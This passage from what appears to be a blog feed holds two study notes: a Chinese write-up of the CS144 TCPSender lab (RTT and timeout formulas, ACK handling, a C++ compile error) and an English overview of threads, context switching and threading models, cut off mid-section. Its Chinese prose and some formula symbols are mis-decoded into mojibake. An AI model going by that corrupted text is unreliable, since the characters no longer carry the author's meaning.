style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">Î±</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>=</mo><mo stretchy="false">(</mo><mn>1</mn><mo>âˆ’</mo><mi>Î²</mi><mo stretchy="false">)</mo><mo>âˆ—</mo><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mi>Î²</mi><mo>âˆ—</mo><mi mathvariant="normal">âˆ£</mi><mi>S</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>âˆ’</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mi mathvariant="normal">âˆ£</mi></mrow><annotation encoding="application/x-tex">DevRTT = (1-Î²)*DevRTT + Î²*|SampleRTT - EstimatedRTT|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">Î²</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">Î²</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">âˆ£</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">âˆ£</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>T</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>o</mi><mi>u</mi><mi>t</mi><mi>I</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>v</mi><mi>a</mi><mi>l</mi><mo>=</mo><mi>E</mi><mi>s</mi><mi>t</mi><mi>i</mi><mi>m</mi><mi>a</mi><mi>t</mi><mi>e</mi><mi>d</mi><mi>R</mi><mi>T</mi><mi>T</mi><mo>+</mo><mn>4</mn><mo>âˆ—</mo><mi>D</mi><mi>e</mi><mi>v</mi><mi>R</mi><mi>T</mi><mi>T</mi></mrow><annotation encoding="application/x-tex">TimeoutInterval = EstimatedRTT + 4 *DevRTT</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span></span></span></span></span></p><p>æ‰€ä»¥å½“é‡åˆ°è¶…æ—¶çš„æƒ…å†µï¼Œæˆ‘ä»¬ä¼šæ ¹æ®ä¸Šè¿°å…¬å¼æ›´æ–°<code>Timer</code>çš„æ—¶é—´é—´éš” RTO å€¼ã€‚è™½ç„¶çœ‹ä¸æ‡‚ä¸Šé¢çš„å…¬å¼ ğŸ˜¦ ï¼ŒTCP çš„å…·ä½“å®è·µä¸­ä¸€èˆ¬ä¹Ÿåªä¼šåœ¨é‡ç½® RTO æ—¶æ‰ä¼šç”¨åˆ°ï¼Œé‡åˆ°è¶…æ—¶é‡ä¼ ä¼šç®€å•åœ°åŠ å€æ—¶é—´é—´éš”ï¼Œæ¯”å¦‚åˆå§‹çš„ RTO æ˜¯ 1 ç§’ï¼Œé‡åˆ°ç¬¬ä¸€æ¬¡è¶…æ—¶ä¼šåŠ å€åˆ° 2 ç§’ï¼Œç¬¬äºŒæ¬¡è¶…æ—¶å°±åŠ å€åˆ° 4 ç§’ã€‚å½“ç„¶ RTO çš„å€¼ä¹Ÿä¸æ˜¯ä¸€ç›´æŒ‡æ•°è¶…çº§åŠ å€çš„ï¼Œé‡åˆ°ç‰¹å®šæƒ…å†µä¼šé‡ç½® RTOã€‚</p><h2 id="3-æ¥å—åˆ°-ack"><a class="markdownIt-Anchor" href="#3-æ¥å—åˆ°-ack"></a> 3. æ¥å—åˆ° ACK</h2><p><strong>å½“<code>Sender</code>æ¥å—åˆ°æ¥æ”¶æ–¹å‘é€çš„ ACK æ—¶ï¼ˆäº‹ä»¶ 3ï¼‰</strong>ï¼Œæœ€å…³å¿ƒçš„ä¸€ä¸ªå­—æ®µæ˜¯ç¡®è®¤å· (acknowledge number, ackno)ã€‚è¿™ä¸ª ACK åºå·æœ‰ä¸‰ç§å¯èƒ½ï¼š</p><ol><li>ackno å°äºæœ€æ—©æœªç¡®è®¤çš„åˆ†ç»„åºå·ï¼Œä¹Ÿå°±æ˜¯è¯´<code>Receiver</code>å†—ä½™åœ°å‘é€äº† ACK</li><li>ackno æ°å¥½ç­‰äºæœ€æ—©æœªç¡®è®¤çš„åˆ†ç»„åºå· (send_base)</li><li>ackno å¤§äºæœ€æ—©æœªç¡®è®¤çš„åˆ†ç»„åºå·</li></ol><p>å†—ä½™ ACK æ¶‰åŠ<code>Sender</code>çš„å¿«é€Ÿé‡ä¼ æœºåˆ¶ï¼Œä¸ºäº†ä¸è®©é€»è¾‘å˜å¾—å¤ªå¤æ‚ï¼Œåœ¨æ­¤å°±å…ˆä¸ä»‹ç»äº†ã€‚åœ¨ç¬¬äºŒä¸ªæƒ…å†µä¸‹<code>ackno = send_base</code>ï¼Œå³æ¥å—æ–¹é‡å¤ç¡®è®¤äº†æœ€æ–°çš„ç¡®è®¤åˆ†ç»„ï¼Œæ‰€ä»¥è¿™æ„å‘³ç€å‘ç”Ÿäº†ä¸¢åŒ…ï¼Œå› æ­¤å¦‚æˆ‘ä»¬åœ¨äº‹ä»¶ 1 å’Œäº‹ä»¶ 2 æåˆ°çš„é‚£æ ·ï¼Œä¼šé‡ä¼ æœ€æ—©çš„æœªç¡®è®¤åˆ†ç»„ï¼ŒåŠ å€ RTOï¼Œå¦‚æœ<code>Timer</code>æœªå¯åŠ¨åˆ™å¯åŠ¨ã€‚åœ¨ç¬¬ä¸‰ä¸ªæƒ…å†µä¸‹<code>ackno &gt; send_base</code>ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶æ–¹ç¡®è®¤äº†ä¸€ä¸ªæ–°çš„åˆ†ç»„ï¼Œç”±äºç´¯ç§¯ç¡®è®¤ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–°<code>send_base</code>ï¼Œå°†æ»‘åŠ¨çª—å£å‘å‰ç§»åŠ¨ï¼ŒåŒæ—¶å‘é€å·²ç»å°è£…å¥½çš„åˆ†ç»„ï¼Œè¿˜è¦é‡å¯<code>Timer</code>ã€‚ï¼ˆçœŸçš„å¾ˆå¤æ‚ï¼‰</p><h1 id="lab3-tcpsender-çš„åŠŸèƒ½"><a class="markdownIt-Anchor" href="#lab3-tcpsender-çš„åŠŸèƒ½"></a> Lab3 TCPSender çš„åŠŸèƒ½</h1><ul><li>è¿½è¸ª<code>Reciever</code>çš„ window sizeï¼Œå®ç°æµé‡æ§åˆ¶</li><li>åªè¦æ¥æ”¶æ–¹çª—å£æ²¡æœ‰æ»¡ï¼Œæˆ–è€…ä¸Šå±‚æ²¡æœ‰æ•°æ®å‘é€ä¸‹æ¥ï¼Œ<code>Sender</code>éƒ½åº”è¯¥å°†æ•°æ®å°è£…æˆ segment åæŒç»­åœ°å‘é€ç»™æ¥æ”¶æ–¹</li><li>é€šè¿‡ç»´æŠ¤ä¸€ä¸ª outstanding packets çš„é›†åˆæ¥è¿½è¸ªå‘é€å‡ºå»ä½†è¿˜æœªæ¥æ”¶çš„åˆ†ç»„</li><li>å®ç°è¶…æ—¶é‡ä¼ æœºåˆ¶</li></ul><p>ä¸‹é¢æ˜¯å®éªŒç›¸å…³çš„ç»†èŠ‚é—®é¢˜ï¼š</p><blockquote><p>å…³äº<code>tick()</code>ï¼šPeriodically, the owner of the TCPSender will call the TCPSenderâ€™s tick method, indicating the passage of time.<br>ä»€ä¹ˆæ—¶å€™å¯åŠ¨<code>timer</code>ï¼šEvery time a segment containing data is sent, if the timer is not running we should then start it up.<br>å¦‚ä½•å‘é€ä¸€ä¸ªåˆ†ç»„ï¼šPush it on to the <code>segments_out_queue</code>. As far as your <code>TCPSender</code> is concerned, <strong>consider it sent as soon as you push it on to this queue</strong>. Soon the owner will come along and pop it (using the public <code>segments_out()</code> accessor method) and really send it.<br>å½“æ»‘åŠ¨çª—å£å¤§å°ä¸º 0 æ—¶ï¼šIf the receiver has announced a window size of zero, the fill window method should <strong>act like the window size is one</strong>.</p></blockquote><h1 id="æ€»ç»“ä¸åæ€"><a class="markdownIt-Anchor" href="#æ€»ç»“ä¸åæ€"></a> æ€»ç»“ä¸åæ€</h1><p>Timer çš„è®¾è®¡ --&gt; è®¾è®¡æ¨¡å¼çš„å­¦ä¹  --&gt; åœ¨å®è·µä¸­ç†è§£</p><hr><h1 id="å®éªŒè¿‡ç¨‹ä¸­ç¢°åˆ°çš„é—®é¢˜"><a class="markdownIt-Anchor" href="#å®éªŒè¿‡ç¨‹ä¸­ç¢°åˆ°çš„é—®é¢˜"></a> å®éªŒè¿‡ç¨‹ä¸­ç¢°åˆ°çš„é—®é¢˜</h1><h2 id="1-make-ç¼–è¯‘é”™è¯¯"><a class="markdownIt-Anchor" href="#1-make-ç¼–è¯‘é”™è¯¯"></a> 1. make ç¼–è¯‘é”™è¯¯</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS144_Lab/libsponge/tcp_sender.hh:78:16: error: â€˜TCPSender::_streamâ€™ will be initialized after [-Werror=reorder]</span><br><span class="line">78 |     ByteStream _stream;</span><br></pre></td></tr></table></figure><p>The error youâ€™re seeing (<code>-Werror=reorder</code>) indicates that your member variables in the initializer list of the constructor are not initialized in the order they are declared in the class. In C++, <strong>member variables are always initialized in the order of declaration in the class</strong>, regardless of the order specified in the constructor initializer list. If the order in the initializer list doesnâ€™t match the order of declaration, it leads to a warning, which in your case is treated as an error due to <code>-Werror</code>.<br>åŸå› ï¼šåœ¨æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼Œæˆå‘˜å˜é‡æ²¡æœ‰æŒ‰ç…§ç±»å£°æ˜ä¸­çš„é¡ºåºè¿›è¡Œåˆå§‹åŒ–</p><h2 id="2-syn-æŠ¥æ–‡æ®µå‘é€"><a class="markdownIt-Anchor" href="#2-syn-æŠ¥æ–‡æ®µå‘é€"></a> 2. SYN æŠ¥æ–‡æ®µå‘é€</h2><p>åœ¨åˆæ­¥å®Œæˆ<code>TCPSender</code>åæˆ‘å‘ç°è‡ªå·±çš„å®ç°å¹¶æ²¡æœ‰å»å¤„ç†å¥½ SYN åŒ…æ˜¯è¦åœ¨ä½•æ—¶å‘é€ï¼Œé€šè¿‡ç¬¬ä¸€ä¸ªæµ‹è¯•<code>send_ack.cc</code>å¯ä»¥çŸ¥é“ï¼Œè¦æ±‚å®ç°çš„ SYN åŒ…éƒ½æ˜¯ä¸è´Ÿè½½æ•°æ®çš„ï¼Œ<code>Header</code>ä¸­çš„<code>syn</code>å­—æ®µå€¼ä¸º 1ï¼ŒåŒæ—¶è¿™ä¸ªåˆ†ç»„æ˜¯å æ®åºå·ç©ºé—´çš„ã€‚å‡è®¾æ­¤æ—¶åˆå§‹åŒ–çš„éšæœºåºå·ä¸º<code>_isn</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªåˆå§‹åŒ– SYN åŒ…çš„åºå·å°±æ˜¯_isnï¼Œå‘é€åæ›´æ–°<code>_next_seqno = _isn + 1</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test.<span class="built_in">execute</span>(ExpectSegment&#123;&#125;.<span class="built_in">with_no_flags</span>().<span class="built_in">with_syn</span>(<span class="literal">true</span>).<span class="built_in">with_payload_size</span>(<span class="number">0</span>).<span class="built_in">with_seqno</span>(isn));</span><br><span class="line">test.<span class="built_in">execute</span>(AckReceived&#123;WrappingInt32&#123;isn + <span class="number">1</span>&#125;&#125;);</span><br></pre></td></tr></table></figure><h2 id="3-çŸ¥è¯†å€ºtcp-åˆ†ç»„åºå·çš„æ¦‚å¿µ"><a class="markdownIt-Anchor" href="#3-çŸ¥è¯†å€ºtcp-åˆ†ç»„åºå·çš„æ¦‚å¿µ"></a> 3. çŸ¥è¯†å€ºï¼šTCP åˆ†ç»„åºå·çš„æ¦‚å¿µ</h2><p>ä»¥ä¸ºä¸€ä¸ªåˆ†ç»„æ‰€å æ®çš„åºå·åŒºé—´é•¿åº¦æ˜¯æ•´ä¸ª<code>TCPSegment</code>çš„å¤§å°ï¼Œå…¶å®åªæ˜¯ç®—<code>payload</code>çš„å¤§å°ï¼ŒåŒæ—¶<code>SYN</code>å’Œ<code>FIN</code>å æ®ä¸€ä¸ªå­—èŠ‚ç©ºé—´ï¼Œ<code>Header</code>æ˜¯ä¸ç®—çš„ï¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">TCPSegment::length_in_sequence_space</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="built_in">payload</span>().<span class="built_in">str</span>().<span class="built_in">size</span>() + (<span class="built_in">header</span>().syn ? <span class="number">1</span> : <span class="number">0</span>) + (<span class="built_in">header</span>().fin ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å‰è¨€&quot;&gt;&lt;/a&gt; å‰è¨€&lt;/h1&gt;
&lt;p&gt;æ—¶éš”ä¸€ä¸ªæœˆåˆé‡æ–°å›åˆ°äº† CS144 çš„å®éªŒå½“ä¸­ï¼Œä¹‹æ‰€ä»¥åšå¾—å¦‚æ­¤ä¹‹æ…¢ï¼Œä¸»è¦åŸå› è¿˜æ˜¯è‡ªå·±èƒ½åŠ›ä¸å¤Ÿï¼ˆèœæ˜¯åŸç½ªï¼‰ã€‚æœ‰æ—¶ä»¥ä¸ºè‡ªå·±ä»â€œæ„Ÿæ€§è®¤çŸ¥â€ä¸Šå‡åˆ°äº†â€œç†</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Operating System Concepts: Multithreaded Programming</title>
    <link href="http://example.com/2024/12/03/Operating-System-Concepts-Ch4/"/>
    <id>http://example.com/2024/12/03/Operating-System-Concepts-Ch4/</id>
    <published>2024-12-03T09:12:32.577Z</published>
    <updated>2024-12-03T09:16:56.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="key-objectives"><a class="markdownIt-Anchor" href="#key-objectives"></a> Key objectives</h1><ul><li>Introduce the notion of a thread</li><li>Explicit threading - APIs for thread libraries</li><li>Implicit threading - kernel level thread management</li><li>Examine issues related to mutithreaded programming</li></ul><h1 id="thread-concept"><a class="markdownIt-Anchor" href="#thread-concept"></a> Thread Concept</h1><p>A thread is a basic unit of CPU utilization, in other word, a fundamental unit of CPU execution. It comprises of:</p><ul><li><strong>a thread ID, TID</strong></li><li><strong>a program counter</strong></li><li><strong>a register set</strong></li><li><strong>a stack</strong><br>And it shares with other threads belonging to the <em>same process</em>:</li><li><strong>code</strong> section</li><li><strong>data</strong> section</li><li><strong>operating-system resources</strong> + open files (and other memory management information) + signals (ps: signal handlers are in shared code section)<br>A thread can also be viewed as a flow of control. A traditional process has a single thread of control.</li></ul><p>Since each thread executes independently, each thread has its own understanding of the stack and of the registers.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/layout.png" alt="layout.png"><br>The bad part is that unlike the protection that exists among processes, the operating system can not prevent threads from interfering with each other â€“ they share the same process space.</p><h2 id="motivation"><a class="markdownIt-Anchor" href="#motivation"></a> Motivation</h2><p>The first question merges in mind is that - why we need to introduce the concept of <strong>thread</strong>?</p><p>A process may have some independent parts of execution which can be executed asynchronically. Take Web browser as an example, it might have one thread displaying images or text (renderer) while another thread retrieves data from network (across NIC), these are relatively different work and need few communication, which can be seen as <em>independent</em>.</p><p>A process might have to handle some duplicate requests. Think about a Web server, it may perform several similar tasks, such as accepting client request for web pages, images or videos. If the web server program runs as a traditional single-threaded process, it can serve only one client at any point since concurrency is not true <em>parellelism</em>! One solution to the problem is to create a separate new process to serve every client. But thatâ€™s huge resource consumption because creating a new process is time-consuming and resource-intensive (and we terminate it when task finishes), and itâ€™s in low resource utilization because the process just performs the same tasks as the original process (say, search data in DB and return it to client).</p><p>So in this cirsumstance, why not just create a more lightweight process - thread?<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/server.png" alt="server.png"></p><h2 id="benefits"><a class="markdownIt-Anchor" href="#benefits"></a> Benefits</h2><ul><li><strong>Responsiveness:</strong> allowing program to continue running even if part of it is blocked or is performing a lengthy operation, thereby increasing reponsiveness to the user</li><li><strong>Resource sharing:</strong> sharing the memory and resources of the process to which they belong to, which allows an aplication to have several threads of activity within the same address space</li><li><strong>Economy:</strong> more economical to create and context-switch threads</li><li><strong>Scalability:</strong> threads can run in parellel on different processing cores, which takes advantage of muticores system</li></ul><h1 id="mechanism-of-thread-switching"><a class="markdownIt-Anchor" href="#mechanism-of-thread-switching"></a> Mechanism of Thread Switching</h1><p>Switching the CPU from one thread to another belonging to the same process involves suspending the current thread, saving its <em>state</em> (e.g., registers, accumulator), and then restoring the state of the thread being switched to.</p><p>The thread switch actually completes at the moment a new program counter is loaded into PC; at that point, the CPU is no longer executing the thread switching code, it is executing code associated with the new thread.</p><p>A context switch between threadsÂ does the following:</p><ol><li><strong>Save all registers</strong> (general-perpose, special and CCs) inÂ TCB (Thread Control Block).</li><li>Then we will <strong>save PC</strong>. Instead of saving the current PC, we place the return address (found on the stack in the threadâ€™s activation record) in the threadâ€™s context block. When the thread is resumed later, the resuming address loaded into the PC will be the instruction immediately following the <code>call</code> instruction that invokedÂ <code>Switch()</code>Â earlier.</li><li>Once the current threadâ€™s state has been saved, <strong>load new values into the registers</strong> from the TCB of the next thread. We know that in the perspective of CPU, a context of a process or thread is all about the registers and condition codes (and maybe cache, but not consider here). So when a new stack pointer loaded onto SP, it actually performs â€œstack switchingâ€.</li><li>So what is the exact point a context switch has taken place? That is, when the current PC is replaced by the saved PC found in the process table. Once the saved PC is loaded,Â <code>Switch()</code> is no longer executing; we are now executing instructions associated with the new thread, which should be the instruction immediately following the call toÂ <code>Switch()</code>. <strong>As soon as the new PC is loaded, a context switch has taken place.</strong></li></ol><h1 id="multithreading-model"><a class="markdownIt-Anchor" href="#multithreading-model"></a> Multithreading Model</h1><h2 id="user-level-thread-and-kernel-level-thread"><a class="markdownIt-Anchor" href="#user-level-thread-and-kernel-level-thread"></a> User Level thread and Kernel Level thread</h2><p><strong>Support</strong> for threads may be provided eitherat the user level, for <strong>user threads</strong>, or by the kernel, for <strong>kernel threads</strong>. User threads are supported above the kernel and are managed without kernel support, whereas kernel threads are suported an managed directly by the operating system.</p><p>There are two confusing terms, one is â€œ<em>support</em>â€ and the other is â€œ<em>user/kernel thread</em>â€.</p><p>To my understading, user level thread and kernel level thread are two abstract concepts. User threads are visible to user/programmer which means they can be manipulated by users. While kernel threads are visible to operating system, they are managed by kernel, and most importantly, they are the actual unit to be scheduled by kernel or to be executed by CPU.</p><p>So in order to make a user thread to be executed, a relationship must exist between user threads and kernel threads, that is <strong>mapping</strong>. The following are the three common ways to establish such a relationship.</p><h2 id="many-to-one-model"><a class="markdownIt-Anchor" href="#many-to-one-model"></a> Many-to-One Model</h2><p>The many-to-one model maps many user threads to a single kernel thread. Thread management (creation, termination, scheduling, etc) is implemented by <em>thread library</em>, so kernel is unaware of these threads and it can only â€œseeâ€ one user thread at any time.</p><p>This model is efficient since the management is all done in user level, without diving into kernel mode. However, if a thread calls a blocking system call (e.g. <code>sleep()</code>, <code>wait()</code> or I/O request), the entire process will block. Also, because only one thread can access the kernel at a time, it canâ€™t make use of mutiple processors in muticores environment.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/many-to-one.png" alt="many-to-one.png"></p><h2 id="one-to-one-model"><a class="markdownIt-Anchor" href="#one-to-one-model"></a> One-to-One Model</h2><p>The one-to-one model maps each user thread to a kernel thread. It not only provides more concurrency by allowing another thread to run when a thread makes a blocking system call, but also allows mutiple threads to run in parallel in muticores environment.</p><p>The only drawback is that creating and manipulating a bunch of kernel threads bring a great overhead and can burden the performance of an application.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/one-to-one.png" alt="one-to-one.png"></p><h2 id="lightweight-process-lwp"><a class="markdownIt-Anchor" href="#lightweight-process-lwp"></a> Lightweight Process (LWP)</h2><p><em>Copy from <a href="https://cseweb.ucsd.edu">https://cseweb.ucsd.edu</a></em></p><p>Kernel threads are great for kernel writers and user threads answer many of the needs of users, but they are not perfect. Consider these examples:</p><ul><li>On a multiprocessor system, only one thread within a process can execute at a time</li><li>A process that consists of many threads, each of which may be able to execute at any time, will not get any more CPU time than a process containing only one thread</li><li>If any thread within a process makes a system call, all threads within that process will be blocked because of the context switch.</li><li>If any user thread blocks waiting for I/O or a resource, the entire process blocks. (Thread libraries usually replace blocking calls with non-blocking calls whenever possible to mitigate this.)</li></ul><p>To address these needs, we need to have a kernel supported user thread. That is to say, we need a facility for threads to share resources within a process, but we also need the ability of the kernel to preempt, schedule, and dispatch threads. This type of thread is called aÂ <em>kernel supported user thread</em>Â or aÂ <em>light-weight process (LWP)</em>. A light-weight process is in contrast with aÂ <em>heavy-weight process</em>Â otherwise known as a process or task.</p><p>Our model of the universe has gone from looking like this:<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/old.png" alt="old.png"><br>To looking like this:<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/new.png" alt="new.png"></p><p>To the user-thread library, the LWP appears to be a virtual processor on which the application can schedule a user thread to run. Each LWP is attached to a kernel thread, and <strong>it is kernel threads that the operating system schedules to run on physical processors</strong> (Ch 5.).<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/lwp.png" alt="lwp.png"></p><h2 id="many-to-many-model"><a class="markdownIt-Anchor" href="#many-to-many-model"></a> Many-to-Many Model</h2><p>Based on LWPs, the many-to-many model mutiplexes many user-level threads to a smaller or equal number of kernel threads. Developers can create as many user threads as necessary, and the corresponding kernel threads can run in parallel on a mutiprocessor.<br><img src="/2024/12/03/Operating-System-Concepts-Ch4/many-to-many.png" alt="many-to-many.png"></p><h1 id="user-level-and-kernel-level-multithreading"><a class="markdownIt-Anchor" href="#user-level-and-kernel-level-multithreading"></a> User-level and Kernel-level Multithreading</h1><p>The key difference between <strong>explicitly user-level thread libraries</strong> (e.g., <code>pthread</code> or <code>windows.h</code>) and <strong>implicitly kernel-level thread abstractions</strong> (e.g., thread pools, OpenMP, or GCD) lies in <strong>control granularity</strong> and <strong>abstraction level</strong>, which affects <strong>how threads are managed</strong> and <strong>who is responsible for managing them</strong>.</p><h3 id="1-user-level-thread-libraries-explicit-control"><a class="markdownIt-Anchor" href="#1-user-level-thread-libraries-explicit-control"></a> 1. User-Level Thread Libraries (Explicit Control)</h3><p>Examples: <code>pthread</code> (POSIX threads), <code>windows.h</code> (Windows threading API)</p><h4 id="characteristics"><a class="markdownIt-Anchor" href="#characteristics"></a> Characteristics:</h4><ul><li><strong>Explicit Thread Management:</strong><br>The programmer directly creates, manages, and synchronizes threads using APIs like <code>pthread_create</code>, <code>pthread_join</code>, or <code>CreateThread</code>.</li><li><strong>Fine-Grained Control:</strong><br>The library exposes lower-level primitives, allowing the programmer to:<ul><li>Decide when and how to create threads.</li><li>Explicitly synchronize threads with mutexes, condition variables, etc.</li><li>Handle thread termination and resource cleanup.</li></ul></li><li><strong>User-Space Scheduling:</strong><br>If implemented as purely user-level threads (like in the Many-to-One model), the kernel may not even be aware of these threads, and the thread library handles scheduling in user space. This provides lightweight thread management but can suffer from blocking issues.</li></ul><h3 id="2-kernel-level-thread-libraries-implicit-abstractions"><a class="markdownIt-Anchor" href="#2-kernel-level-thread-libraries-implicit-abstractions"></a> 2. 